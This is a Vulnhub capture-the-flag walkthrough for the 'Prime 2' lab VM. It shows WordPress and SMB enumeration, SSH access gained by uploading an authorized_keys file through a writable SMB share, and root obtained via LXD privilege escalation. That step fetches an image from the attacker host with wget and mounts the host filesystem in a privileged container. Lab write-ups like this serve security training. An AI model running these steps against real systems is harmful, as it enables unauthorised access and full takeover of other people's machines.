# Prime(2021) 2 Vulnub Walkthrough

****Description:**** This vm will give you some real concept that is needfull for a global level certifications. And you are going to enjoy this VM because of there is a good combination of network and web pentesting.

### Scanning

Lets start with nmap

**nmap 192.168.122.180<target-ip>**

Port 22, 80, 139, 445 are open.

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled.png)

**nmap -sV -A 192.168.122.180 (Service Version scanning)**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%201.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%201.png)

**nmap -p- 192.168.122.180 (Full Port Scanning)**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%202.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%202.png)

### Enumeration

Port 80

**dirb http://192.196.122.180/**

Found wp directory which is wordpress

```jsx
root@kali:~# dirb http://192.168.122.180/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu May 20 06:39:56 2021
URL_BASE: http://192.168.122.180/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.122.180/ ----
==> DIRECTORY: http://192.168.122.180/css/                                     
==> DIRECTORY: http://192.168.122.180/images/                                  
+ http://192.168.122.180/index.html (CODE:200|SIZE:5761)                       
==> DIRECTORY: http://192.168.122.180/javascript/                              
==> DIRECTORY: http://192.168.122.180/server/                                  
+ http://192.168.122.180/server-status (CODE:403|SIZE:280)                     
==> DIRECTORY: **http://192.168.122.180/wp/**                                      
                                                                               
---- Entering directory: http://192.168.122.180/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/javascript/ ----
==> DIRECTORY: http://192.168.122.180/javascript/jquery/                       
                                                                               
---- Entering directory: http://192.168.122.180/server/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/wp/ ----
+ http://192.168.122.180/wp/.git/HEAD (CODE:200|SIZE:23)                       
+ http://192.168.122.180/wp/index.php (CODE:301|SIZE:0)                        
==> DIRECTORY: http://192.168.122.180/wp/wp-admin/                             
==> DIRECTORY: http://192.168.122.180/wp/wp-content/                           
==> DIRECTORY: http://192.168.122.180/wp/wp-includes/                          
+ http://192.168.122.180/wp/xmlrpc.php (CODE:405|SIZE:42)                      
                                                                               
---- Entering directory: http://192.168.122.180/javascript/jquery/ ----
+ http://192.168.122.180/javascript/jquery/jquery (CODE:200|SIZE:287600)       
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-admin/ ----
+ http://192.168.122.180/wp/wp-admin/admin.php (CODE:302|SIZE:0)               
==> DIRECTORY: http://192.168.122.180/wp/wp-admin/css/                         
==> DIRECTORY: http://192.168.122.180/wp/wp-admin/images/                      
==> DIRECTORY: http://192.168.122.180/wp/wp-admin/includes/                    
+ http://192.168.122.180/wp/wp-admin/index.php (CODE:302|SIZE:0)               
==> DIRECTORY: http://192.168.122.180/wp/wp-admin/js/                          
==> DIRECTORY: http://192.168.122.180/wp/wp-admin/maint/                       
==> DIRECTORY: http://192.168.122.180/wp/wp-admin/network/                     
==> DIRECTORY: http://192.168.122.180/wp/wp-admin/user/                        
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-content/ ----
+ http://192.168.122.180/wp/wp-content/index.php (CODE:200|SIZE:0)             
==> DIRECTORY: http://192.168.122.180/wp/wp-content/plugins/                   
==> DIRECTORY: http://192.168.122.180/wp/wp-content/themes/                    
==> DIRECTORY: http://192.168.122.180/wp/wp-content/upgrade/                   
==> DIRECTORY: http://192.168.122.180/wp/wp-content/uploads/                   
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-admin/network/ ----
+ http://192.168.122.180/wp/wp-admin/network/admin.php (CODE:302|SIZE:0)       
+ http://192.168.122.180/wp/wp-admin/network/index.php (CODE:302|SIZE:0)       
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-admin/user/ ----
+ http://192.168.122.180/wp/wp-admin/user/admin.php (CODE:302|SIZE:0)          
+ http://192.168.122.180/wp/wp-admin/user/index.php (CODE:302|SIZE:0)          
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-content/plugins/ ----
+ http://192.168.122.180/wp/wp-content/plugins/index.php (CODE:200|SIZE:0)     
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-content/themes/ ----
+ http://192.168.122.180/wp/wp-content/themes/index.php (CODE:200|SIZE:0)      
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-content/upgrade/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://192.168.122.180/wp/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu May 20 06:41:25 2021
DOWNLOADED: 46120 - FOUND: 15
root@kali:~#
```

Open [http://192.168.122.180/](http://192.168.122.180/)wp/ in browser

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%203.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%203.png)

**nikto -h http://192.168.122.180/wp/**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%204.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%204.png)

**wpscan --url [http://192.168.122.180/wp/](http://192.168.122.180/wp/) --enumerate ap**

```jsx
root@kali:~# **wpscan --url http://192.168.122.180/wp/ --enumerate ap**
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.4
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time
[i] Last database update: 2018-08-21
[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > n
[+] URL: http://192.168.122.180/wp/
[+] Started: Thu May 20 06:43:25 2021

[+] Interesting header: LINK: <http://192.168.122.180/wp/index.php/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.46 (Ubuntu)
[+] XML-RPC Interface available under: http://192.168.122.180/wp/xmlrpc.php   [HTTP 405]
[+] Found an RSS Feed: http://192.168.122.180/wp/index.php/feed/   [HTTP 200]
[!] Detected 1 user from RSS feed:
+-------+
| Name  |
+-------+
| admin |
+-------+
[!] Upload directory has directory listing enabled: http://192.168.122.180/wp/wp-content/uploads/
[!] Includes directory has directory listing enabled: http://192.168.122.180/wp/wp-includes/

[+] Enumerating WordPress version ...

[+] WordPress version 5.8-alpha-50812 

[+] WordPress theme in use: twentytwentyone - v1.3

[+] Name: twentytwentyone - v1.3
 |  Location: http://192.168.122.180/wp/wp-content/themes/twentytwentyone/
 |  Readme: http://192.168.122.180/wp/wp-content/themes/twentytwentyone/readme.txt
 |  Style URL: http://192.168.122.180/wp/wp-content/themes/twentytwentyone/style.css
 |  Theme Name: Twenty Twenty-One
 |  Theme URI: https://wordpress.org/themes/twentytwentyone/
 |  Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush....
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
 | 1 plugin found:

[+] Name: gracemedia-media-player - v1.0
 |  Latest version: 1.0 (up to date)
 |  Last updated: 2013-07-21T15:09:00.000Z
 |  Location: http://192.168.122.180/wp/wp-content/plugins/gracemedia-media-player/
 |  Readme: http://192.168.122.180/wp/wp-content/plugins/gracemedia-media-player/readme.txt
[!] Directory listing is enabled: http://192.168.122.180/wp/wp-content/plugins/gracemedia-media-player/

[+] Enumerating all plugins (may take a while and use a lot of system resources) ...

   Time: 00:02:24 <====================================================================================> (75995 / 75995) 100.00% Time: 00:02:24

[+] We found 1 plugin:

[+] Name: gracemedia-media-player - v1.0
 |  Latest version: 1.0 (up to date)
 |  Last updated: 2013-07-21T15:09:00.000Z
 |  Location: http://192.168.122.180/wp/wp-content/plugins/gracemedia-media-player/
 |  Readme: http://192.168.122.180/wp/wp-content/plugins/gracemedia-media-player/readme.txt
[!] Directory listing is enabled: http://192.168.122.180/wp/wp-content/plugins/gracemedia-media-player/

[+] Finished: Thu May 20 06:46:02 2021
[+] Elapsed time: 00:02:36
[+] Requests made: 76396
[+] Memory used: 88.453 MB
root@kali:~#
```

Enumerating SMB share

**smbclient -L 192.168.122.180**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%205.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%205.png)

**smbclient //192.168.122.180/welcome** 

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%206.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%206.png)

Downloading file something

**get something**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%207.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%207.png)

**cat something**

Found user **jarves**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%208.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%208.png)

As ssh port is also. Lets try to connect through ssh using public key.

In SMB share, create .ssh directory

**mksir .ssh** 

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%209.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%209.png)

copy your id_rsa.pub key in authorized_keys

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2010.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2010.png)

Upload authorized_keys in smb .ssh directory

**cd .ssh**

**put authorized_keys**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2011.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2011.png)

Now connect with jarves user using ssh

**ssh jarves@192.168.122.180**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2012.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2012.png)

** Successfully connected through ssh and got shell for jarves user

### Privilege escalation

**id**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2013.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2013.png)

***user jarves is member o lxd group

For LXD Privilege escalation i followed article = [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)

1. **Steps to be performed on the attacker machine**:
- Download build-alpine in your local machine through the git repository.
- Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.
- Transfer the tar file to the host machine

2. **Steps to be performed on the host machine:**

- Download the alpine image
- Import image for lxd
- Initialize the image inside a new container.
- Mount the container inside the /root directory

In local machine,

```jsx
1. git clone  https://github.com/saghul/lxd-alpine-builder.git
2. cd lxd-alpine-builder
3. ./build-alpine
```

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2014.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2014.png)

On running the above command, a tar.gz file is created in the working directory that we have transferred to the host machine.

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2015.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2015.png)

Now start http server to transfer file from local machine to target.

**python3 -m http.server 8000**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2016.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2016.png)

Download .tar.gz file in target using wget command

**wget [http://192.168.122.178:8000/alpine](http://192.168.122.178:8000/alpine)-v3.13-i686-20210520_0747.tar.gz**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2017.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2017.png)

After the image is built it can be added as an image to LXD as follows:

**lxc image import ./alpine-v3.13-i686-20210520_0747.tar.gz --alias myimage**

use the list command to check the list of images

lxc image list

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2018.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2018.png)

lxc init myimage lxd-exploit -c security.privileged=true

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2019.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2019.png)

It is showing error no storage pool found, to fix this use command= **lxd init**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2020.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2020.png)

Aftfer creating pool storage again run command

**lxc init myimage lxd-exploit -c security.privileged=true**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2021.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2021.png)

**lxc config device add lxd-exploit mydevice disk source=/ path=/mnt/root recursive=true**

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2022.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2022.png)

**lxc start lxd-exploit**

**lxc exec lxd-exploit /bin/sh**

id

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2023.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2023.png)

We successfully got shell for root user.

![Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2024.png](Prime%202%20a3fd8338a48f474b9c5ea94d8b1cf90b/Untitled%2024.png)
